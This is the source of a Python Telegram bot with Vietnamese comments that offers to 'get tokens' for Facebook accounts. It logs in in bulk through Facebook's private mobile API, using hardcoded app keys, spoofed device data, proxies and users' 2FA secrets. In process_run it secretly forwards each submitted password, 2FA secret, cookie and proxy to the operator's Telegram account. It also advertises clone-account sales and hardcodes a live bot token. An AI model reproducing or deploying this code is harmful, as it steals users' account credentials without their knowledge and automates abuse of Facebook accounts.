import random
import string
import json
import time
import requests
import uuid
import pyotp
import base64
import io
import struct
import os
import threading
from flask import Flask
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)
from telegram.error import TelegramError
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# ================= CẤU HÌNH WEB SERVER (FLASK) CHO RENDER =================
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app_flask.run(host='0.0.0.0', port=port)

# ================= CẤU HÌNH BOT =================
TELEGRAM_BOT_TOKEN = "8694132202:AAGdtE43NdakjEip6ZM5IAVvImRcYwoRbrM"
ADMIN_TELEGRAM_ID = 8800581554
USER_IDS_FILE = "users.json"
REQUIRED_GROUP_USERNAME = "@LSOYH-KICvMzMTY9" # Hoặc bạn có thể dùng Chat ID dạng số của nhóm (ví dụ: -100xxxxxxxxxx)
# Lưu ý: Với link mời dạng kín như https://t.me/+LSOYH-KICvMzMTY9, cách tốt nhất là dùng Chat ID chuẩn của nhóm (ví dụ: -100123456789) vào biến dưới đây:
REQUIRED_GROUP_ID = -1004435579756 # <-- Thay thế bằng Chat ID thực tế của nhóm bạn (bắt đầu bằng -100)

def load_users():
    try:
        with open(USER_IDS_FILE, "r") as f:
            return set(json.load(f))
    except:
        return set()

def save_users(users_set):
    with open(USER_IDS_FILE, "w") as f:
        json.dump(list(users_set), f)

# ================= HÀM KIỂM TRA THÀNH VIÊN NHÓM =================
async def check_user_in_group(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        # Lấy thông tin trạng thái của user trong nhóm
        member = await context.bot.get_chat_member(chat_id=REQUIRED_GROUP_ID, user_id=user_id)
        # Các trạng thái được coi là thành viên đang tham gia
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Lỗi kiểm tra nhóm: {e}")
        # Nếu bot chưa được thêm vào nhóm hoặc chưa làm admin, hàm sẽ văng lỗi
        return False

# ================= XỬ LÝ PROXY & FACEBOOK LOGIN =================
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '://' in proxy_str:
        scheme, rest = proxy_str.split('://', 1)
        parts = rest.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f"{scheme}://{user}:{pwd}@{ip}:{port}"
        return proxy_str
    
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        return f"http://{proxy_str}"
    return f"http://{proxy_str}"

class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key(proxies=None):
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2', 'flow': 'CONTROLLER_INITIALIZATION', 'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch', 'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
            }
            response = requests.post(url, params=params, proxies=proxies, timeout=15).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception as e:
            raise Exception(f"Không thể lấy public key: {e}")

    @staticmethod
    def encrypt(password, public_key=None, key_id="25", proxies=None):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key(proxies=proxies)
        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception as e:
            raise Exception(f"Lỗi mã hóa mật khẩu: {e}")

class FacebookLogin:
    API_URL = "https://b-graph.facebook.com/auth/login"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    API_KEY = "882a8490361da98702bf97a021ddc14d"
    SIG = "214049b9f17c38bd767de53752b53946"
    
    BASE_HEADERS = {
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-net-hni": "45201", "zero-rated": "0", "x-fb-sim-hni": "45201",
        "x-fb-connection-quality": "EXCELLENT", "x-fb-friendly-name": "authenticate",
        "authorization": "OAuth null", "x-fb-connection-type": "WIFI",
        "x-fb-http-engine": "Liger", "x-fb-client-ip": "True", "x-fb-server-cluster": "True"
    }
    
    def __init__(self, uid_phone_mail, password, twwwoo2fa="", machine_id=None, proxy=None):
        self.uid_phone_mail = uid_phone_mail
        self.twwwoo2fa = twwwoo2fa
        self.session = requests.Session()
        self.proxies = None
        if proxy:
            formatted_proxy = format_proxy(proxy)
            self.proxies = {"http": formatted_proxy, "https": formatted_proxy}
            self.session.proxies.update(self.proxies)

        if password.startswith("#PWD_FB4A"):
            self.password = password
        else:
            self.password = FacebookPasswordEncryptor.encrypt(password, proxies=self.proxies)
        
        self.device_id = str(uuid.uuid4())
        self.adid = str(uuid.uuid4())
        self.secure_family_device_id = str(uuid.uuid4())
        self.machine_id = machine_id if machine_id else ''.join(random.choices(string.ascii_letters + string.digits, k=24))
        self.jazoest = ''.join(random.choices(string.digits, k=5))
        self.sim_serial = ''.join(random.choices(string.digits, k=20))
        self.headers = self.BASE_HEADERS.copy()
        self.headers["user-agent"] = "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274;]"
        
        self.data = {
            "format": "json", "email": self.uid_phone_mail, "password": self.password,
            "credentials_type": "password", "generate_session_cookies": "1", "locale": "vi_VN",
            "client_country_code": "VN", "api_key": self.API_KEY, "access_token": self.ACCESS_TOKEN,
            "adid": self.adid, "device_id": self.device_id, "generate_analytics_claim": "1",
            "cpl": "true", "try_num": "1", "family_device_id": self.device_id,
            "secure_family_device_id": self.secure_family_device_id, "sim_serials": f'["{self.sim_serial}"]',
            "openid_flow": "android_login", "openid_provider": "google", "openid_tokens": "[]",
            "account_switcher_uids": f'["{self.uid_phone_mail}"]', "source": "login",
            "machine_id": self.machine_id, "jazoest": self.jazoest, "meta_inf_fbmeta": "V2_UNTAGGED",
            "advertiser_id": self.adid, "currently_logged_in_userid": "0",
            "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "Fb4aAuthHandler", "sig": self.SIG
        }

    def _handle_2fa(self, error_data):
        if not self.twwwoo2fa:
            return {'success': False, 'error': 'Cần mã 2FA nhưng chưa được cung cấp'}
        try:
            twofactor_code = pyotp.TOTP(self.twwwoo2fa).now()
            data_2fa = {
                'locale': 'vi_VN', 'format': 'json', 'email': self.uid_phone_mail,
                'device_id': self.device_id, 'access_token': self.ACCESS_TOKEN,
                'generate_session_cookies': 'true', 'generate_machine_id': '1',
                'twofactor_code': twofactor_code, 'credentials_type': 'two_factor',
                'error_detail_type': 'button_with_disabled', 'first_factor': error_data['login_first_factor'],
                'password': self.password, 'userid': error_data['uid'], 'machine_id': error_data['login_first_factor']
            }
            response = self.session.post(self.API_URL, data=data_2fa, headers=self.headers, timeout=15)
            res_json = response.json()
            if 'access_token' in res_json:
                return {'success': True, 'access_token': res_json['access_token']}
            return {'success': False, 'error': res_json.get('error', {}).get('message', 'Lỗi 2FA')}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def login(self):
        try:
            response = self.session.post(self.API_URL, headers=self.headers, data=self.data, timeout=15)
            res_json = response.json()
            if 'access_token' in res_json:
                return {'success': True, 'access_token': res_json['access_token']}
            if 'error' in res_json:
                error_data = res_json.get('error', {}).get('error_data', {})
                if 'login_first_factor' in error_data and 'uid' in error_data:
                    return self._handle_2fa(error_data)
                return {'success': False, 'error': res_json['error'].get('message', 'Lỗi đăng nhập')}
            return {'success': False, 'error': 'Phản hồi không xác định'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ================= QUẢN LÝ TRẠNG THÁI (USER CONTEXT) =================
user_states = {}

# Trạng thái ghi nhớ người dùng đã từng thông báo "đã tham gia nhóm" chưa để tránh spam thông báo liên tục
notified_joined = set()

# ================= TELEGRAM BOT HANDLERS =================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # 1. Kiểm tra xem người dùng đã tham gia nhóm chưa
    is_member = await check_user_in_group(user_id, context)

    if not is_member:
        # Nếu chưa tham gia nhóm, xóa trạng thái thông báo cũ nếu có và gửi yêu cầu tham gia
        if user_id in notified_joined:
            notified_joined.remove(user_id)

        keyboard = [
            [InlineKeyboardButton("🔗 Tham gia nhóm ngay", url="https://t.me/+LSOYH-KICvMzMTY9")],
            [InlineKeyboardButton("🔄 Kiểm tra lại", callback_data="check_membership")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = (
            f"⚠️ **Bạn chưa đủ điều kiện sử dụng bot!**\n\n"
            f"Vui lòng tham gia nhóm [tại đây](https://t.me/+LSOYH-KICvMzMTY9) để có thể tiếp tục sử dụng bot."
        )
        if update.message:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown", disable_web_page_preview=True)
        elif update.callback_query:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown", disable_web_page_preview=True)
        return

    # 2. Nếu đã tham gia nhóm thành công
    if user_id not in notified_joined:
        notified_joined.add(user_id)
        if update.message:
            await update.message.reply_text("✅ Bạn đã tham gia nhóm thành công! Bây giờ bạn có thể sử dụng bot.")
        elif update.callback_query:
            await update.callback_query.message.reply_text("✅ Bạn đã tham gia nhóm thành công! Bây giờ bạn có thể sử dụng bot.")

    users = load_users()
    users.add(user_id)
    save_users(users)
    
    if user_id in user_states:
        del user_states[user_id]

    keyboard = [
        [InlineKeyboardButton("🔑 Get Token", callback_data="menu_gettoken")],
        [InlineKeyboardButton("🛒 Mua Clone", url="https://t.me/clonegiareok_bot")],
        [InlineKeyboardButton("📞 Liên hệ Admin", url="https://t.me/phucvan99")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = (
        f"👋 **Xin chào {user.first_name}!**\n\n"
        "Vui lòng chọn tính năng bên dưới:"
    )
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_TELEGRAM_ID:
        await update.message.reply_text("⛔ Bạn không có quyền sử dụng lệnh này!")
        return

    keyboard = [
        [InlineKeyboardButton("📢 Gửi thông báo cho tất cả thành viên", callback_data="admin_broadcast")],
        [InlineKeyboardButton("⬅️ Thoát", callback_data="menu_back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🛠️ **BẢNG ĐIỀU KHIỂN ADMIN**\n\nVui lòng chọn thao tác:", reply_markup=reply_markup, parse_mode="Markdown")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Xử lý riêng nút bấm kiểm tra tham gia nhóm
    if query.data == "check_membership":
        await start(update, context)
        return

    # **BẢO VỆ TẤT CẢ CÁC NÚT KHÁC:** Kiểm tra lại nếu người dùng đã rời nhóm thì khóa chức năng ngay lập tức
    is_member = await check_user_in_group(user_id, context)
    if not is_member:
        if user_id in notified_joined:
            notified_joined.remove(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔗 Tham gia nhóm ngay", url="https://t.me/+LSOYH-KICvMzMTY9")],
            [InlineKeyboardButton("🔄 Kiểm tra lại", callback_data="check_membership")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text(
            "⚠️ **Bạn đã rời nhóm nên tính năng này đã bị khóa!**\n\nVui lòng tham gia lại nhóm để tiếp tục sử dụng.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    if query.data == "menu_gettoken":
        keyboard = [
            [InlineKeyboardButton("❌ Không có 2FA", callback_data="type_no2fa")],
            [InlineKeyboardButton("🛡️ Có 2FA", callback_data="type_has2fa")],
            [InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text("📌 **Chọn loại tài khoản bạn muốn Get Token:**", reply_markup=reply_markup, parse_mode="Markdown")

    elif query.data == "menu_back":
        await start(update, context)

    elif query.data == "admin_broadcast":
        if user_id != ADMIN_TELEGRAM_ID:
            return
        user_states[user_id] = {"step": "wait_broadcast_msg"}
        await query.message.edit_text(
            "📢 **GỬI THÔNG BÁO TOÀN BỘ THÀNH VIÊN**\n\n"
            "Vui lòng gửi nội dung thông báo bạn muốn gửi đi:",
            parse_mode="Markdown"
        )

    elif query.data in ["type_no2fa", "type_has2fa"]:
        has_2fa = (query.data == "type_has2fa")
        user_states[user_id] = {"step": "wait_accounts", "has_2fa": has_2fa}
        
        syntax = "UID|PASS|COOKIE" if not has_2fa else "UID|PASS|2FA|COOKIE"
        await query.message.edit_text(
            f"📝 **Bước 1/3: Gửi danh sách tài khoản**\n\n"
            f"Mỗi dòng 1 tài khoản theo định dạng:\n`{syntax}`\n\n"
            "*(Hãy gửi toàn bộ danh sách tài khoản của bạn trong 1 tin nhắn)*",
            parse_mode="Markdown"
        )

    elif query.data in ["proxy_yes", "proxy_no"]:
        use_proxy = (query.data == "proxy_yes")
        if user_id not in user_states:
            await query.message.edit_text("⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại.")
            return

        user_states[user_id]["use_proxy"] = use_proxy

        if use_proxy:
            user_states[user_id]["step"] = "wait_proxies"
            await query.message.edit_text(
                "📝 **Bước 3/3: Gửi danh sách Proxy**\n\n"
                "Mỗi dòng 1 proxy (Nếu gửi thiếu sẽ tự chia vòng tròn, gửi thừa sẽ tự lấy đủ):\n"
                "`ip:port:user:pass`",
                parse_mode="Markdown"
            )
        else:
            await query.message.edit_text("🚀 Đang tiến hành xử lý tài khoản, vui lòng đợi...")
            await process_run(update, context, user_id, proxies=[])

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # **BẢO VỆ TIN NHẮN:** Kiểm tra thành viên nhóm trước khi xử lý tin nhắn nhập liệu
    is_member = await check_user_in_group(user_id, context)
    if not is_member:
        if user_id in notified_joined:
            notified_joined.remove(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔗 Tham gia nhóm ngay", url="https://t.me/+LSOYH-KICvMzMTY9")],
            [InlineKeyboardButton("🔄 Kiểm tra lại", callback_data="check_membership")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚠️ **Bạn đã rời nhóm nên tính năng đã bị khóa!**\n\nVui lòng tham gia lại nhóm để tiếp tục sử dụng.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    if user_id not in user_states:
        return

    text = update.message.text.strip()
    state = user_states[user_id]
    step = state.get("step")

    if step == "wait_broadcast_msg":
        if user_id != ADMIN_TELEGRAM_ID:
            del user_states[user_id]
            return

        del user_states[user_id]
        users = load_users()
        success_count = 0
        fail_count = 0

        await update.message.reply_text(f"🚀 Đang tiến hành gửi thông báo đến {len(users)} thành viên...")

        for chat_id in users:
            try:
                broadcast_msg = f"📢 THÔNG BÁO TỪ BOT GETTOKEN\n━━━━━━━━━━━━━━━━━━\n\n{text}"
                await context.bot.send_message(chat_id=chat_id, text=broadcast_msg, parse_mode="Markdown")
                success_count += 1
                time.sleep(0.1)
            except:
                fail_count += 1

        await update.message.reply_text(
            f"✅ **Đã gửi thông báo hoàn tất!**\n\n"
            f"- Gửi thành công: {success_count} người\n"
            f"- Gửi thất bại: {fail_count} người",
            parse_mode="Markdown"
        )
        return

    if step == "wait_accounts":
        accounts = [line.strip() for line in text.split('\n') if line.strip()]
        if not accounts:
            await update.message.reply_text("⚠️ Danh sách tài khoản trống. Vui lòng gửi lại!")
            return

        state["accounts"] = accounts
        state["step"] = "wait_proxy_choice"

        keyboard = [
            [InlineKeyboardButton("✅ Có dùng Proxy", callback_data="proxy_yes")],
            [InlineKeyboardButton("❌ Không dùng Proxy", callback_data="proxy_no")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"✅ Đã nhận **{len(accounts)} tài khoản**.\n\nBạn có muốn sử dụng Proxy cho các tài khoản này không?",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

    elif step == "wait_proxies":
        proxies = [line.strip() for line in text.split('\n') if line.strip()]
        accounts = state["accounts"]

        if not proxies:
            await update.message.reply_text("⚠️ Danh sách proxy trống. Vui lòng gửi lại!")
            return

        mapped_proxies = []
        for i in range(len(accounts)):
            mapped_proxies.append(proxies[i % len(proxies)])

        state["proxies"] = mapped_proxies
        await update.message.reply_text("🚀 Đang tiến hành xử lý tài khoản với đa luồng (Tối đa 15 luồng), vui lòng đợi...")
        await process_run(update, context, user_id, proxies=mapped_proxies)

def worker_task(acc_line, proxy_line, has_2fa):
    try:
        parts = acc_line.split('|')
        if has_2fa:
            if len(parts) < 4:
                return {"success": False, "uid": parts[0] if len(parts)>0 else "Unknown", "error": "Thiếu thông tin 2FA/Cookie", "acc_line": acc_line, "proxy": proxy_line}
            uid, password, twwwoo2fa, cookie = parts[0], parts[1], parts[2].replace(" ", ""), parts[3]
        else:
            if len(parts) < 3:
                return {"success": False, "uid": parts[0] if len(parts)>0 else "Unknown", "error": "Thiếu thông tin Cookie", "acc_line": acc_line, "proxy": proxy_line}
            uid, password, cookie = parts[0], parts[1], parts[2]
            twwwoo2fa = ""

        machine_id = None
        if "datr=" in cookie:
            try:
                machine_id = cookie.split("datr=")[1].split(";")[0]
            except:
                pass

        fb = FacebookLogin(
            uid_phone_mail=uid,
            password=password,
            twwwoo2fa=twwwoo2fa,
            machine_id=machine_id,
            proxy=proxy_line
        )
        
        result = fb.login()
        if result['success']:
            return {"success": True, "uid": uid, "token": result['access_token'], "acc_line": acc_line, "proxy": proxy_line}
        else:
            return {"success": False, "uid": uid, "error": result.get('error'), "acc_line": acc_line, "proxy": proxy_line}
    except Exception as e:
        return {"success": False, "uid": "Unknown", "error": str(e), "acc_line": acc_line, "proxy": proxy_line}

async def process_run(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, proxies: list):
    user = update.effective_user
    state = user_states.get(user_id)
    if not state:
        return

    accounts = state["accounts"]
    has_2fa = state["has_2fa"]
    
    if user_id in user_states:
        del user_states[user_id]

    results_text = "📊 **KẾT QUẢ GET TOKEN:**\n\n"
    username_str = f"@{user.username}" if user.username else f"{user.first_name} (ID: {user.id})"

    max_workers = min(15, len(accounts))
    
    successful_accounts = []
    successful_proxies = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i, acc in enumerate(accounts):
            p = proxies[i] if proxies and i < len(proxies) else None
            futures.append(executor.submit(worker_task, acc, p, has_2fa))

        for future in as_completed(futures):
            res = future.result()
            if res["success"]:
                uid = res["uid"]
                token = res["token"]
                results_text += f"✅ `UID: {uid}`\nToken: `{token}`\n\n"
                
                successful_accounts.append(res['acc_line'])
                successful_proxies.append(res['proxy'] if res['proxy'] else 'Không dùng')
            else:
                uid = res.get("uid", "Unknown")
                err = res.get("error", "Lỗi không xác định")
                results_text += f"❌ `UID: {uid}` | Lỗi: {err}\n\n"
                
                try:
                    admin_err_msg = (
                        f"⚠️ **GET TOKEN THẤT BẠI**\n"
                        f"👤 **User:** {username_str} (`{user.id}`)\n"
                        f"📂 **Tài khoản:** `{res['acc_line']}`\n"
                        f"🌐 **Proxy:** `{res['proxy'] if res['proxy'] else 'Không dùng'}`\n"
                        f"❌ **Lỗi:** {err}"
                    )
                    await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=admin_err_msg, parse_mode="Markdown")
                except:
                    pass

    if successful_accounts:
        try:
            msg1 = f"👤 **Người dùng:** {username_str} (`{user.id}`)"
            await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg1, parse_mode="Markdown")

            msg2 = f"📂 **Tất cả tài khoản chạy thành công:**\n" + "\n".join([f"`{acc}`" for acc in successful_accounts])
            await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg2, parse_mode="Markdown")

            msg3 = f"🌐 **Proxy tương ứng:**\n" + "\n".join([f"`{prx}`" for prx in successful_proxies])
            await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg3, parse_mode="Markdown")
        except:
            pass

    if len(results_text) > 4000:
        for x in range(0, len(results_text), 4000):
            await context.bot.send_message(chat_id=user_id, text=results_text[x:x+4000], parse_mode="Markdown")
    else:
        if update.message:
            await update.message.reply_text(results_text, parse_mode="Markdown")
        elif update.callback_query:
            await update.callback_query.message.reply_text(results_text, parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("🤖 Bot Telegram đã sẵn sàng hoạt động với kiểm tra nhóm...")
    app.run_polling()

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    main()
